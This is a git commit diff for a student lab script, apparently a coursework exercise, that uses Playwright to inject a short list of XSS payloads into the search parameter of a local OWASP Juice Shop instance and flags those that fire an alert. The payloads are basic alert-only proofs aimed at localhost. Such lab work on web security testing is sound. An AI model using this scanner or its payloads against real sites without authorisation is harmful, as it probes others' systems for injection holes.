ea505fcb4609a946a9de52cd858a028c098d5a3e
SCIULKA <natanknioch@gmail.com>
2026-06-06 13:55:57 +0200

    fiinished basic function for xss-scan.py

--- lab 12/xss-scan.py
+++ lab 12/xss-scan.py
@@ -3,10 +3,10 @@ from playwright.async_api import async_playwright
 import urllib.parse
 
 # Configuration
-TARGET_BASE = "http://localhost:3000"  # Change to your Juice Shop instance IP/Port
-SEARCH_ENDPOINT = f"{TARGET_BASE}/#/search?q="
+TARGET_BASE = [
+    "http://localhost:3000/#/"
+    ] 
 
-# A mix of basic and Juice Shop specific XSS payloads
 PAYLOADS = [
     "<script>alert(1)</script>",
     "<iframe src=\"javascript:alert(`xss`)\">",
@@ -14,21 +14,56 @@ PAYLOADS = [
     "</script><script>alert(1)</script>"
 ]
 
-def xss_scan(context, payload):
+SINKS = [
+    "search?q="
+
+]
+
+async def xss_scan(context, payload, target):
     encoded_payload = urllib.parse.quote(payload)
-    volnerable = False
+    vulnerable = False
+
+    page = await context.new_page()
     
+    async def handle_alert(dialog):
+        nonlocal vulnerable
+        if dialog.type == "alert":
+            vulnerable = True
+        await dialog.dismiss()
+     
+    page.on("dialog", handle_alert)
+
+    try:
+        await page.goto(target+encoded_payload, wait_until="networkidle", timeout=5000)
+        await asyncio.sleep(2)  # Wait for potential XSS to trigger
+
+    except Exception as e:
+        print(f"Error during scanning: {e}")
+    finally:
+        await page.close()
+    
+    return vulnerable, payload if vulnerable else None
+
 
 async def main():
     async with async_playwright() as p:
         browser = await p.chromium.launch(headless=True)
-        page = await browser.new_page()
+        context = await browser.new_context()
         
-        # The 'await' keyword tells Python to let other tasks run 
-        # while waiting for the browser network to settle
-        await page.goto("http://localhost:3000/#/search?q=test")
-        print(await page.title())
-        
+        tasks = []
+
+        for base in TARGET_BASE:
+            for sink in SINKS:
+                target = f"{base}{sink}"
+                for payload in PAYLOADS:
+                    tasks.append(xss_scan(context, payload, target))
+
+        scan_results = await asyncio.gather(*tasks)
+        for vulnerable, payload in scan_results:
+            if vulnerable:
+                print(f"Vulnerable to XSS with payload: {payload}")
+
+
         await browser.close()
 
 if __name__ == "__main__":
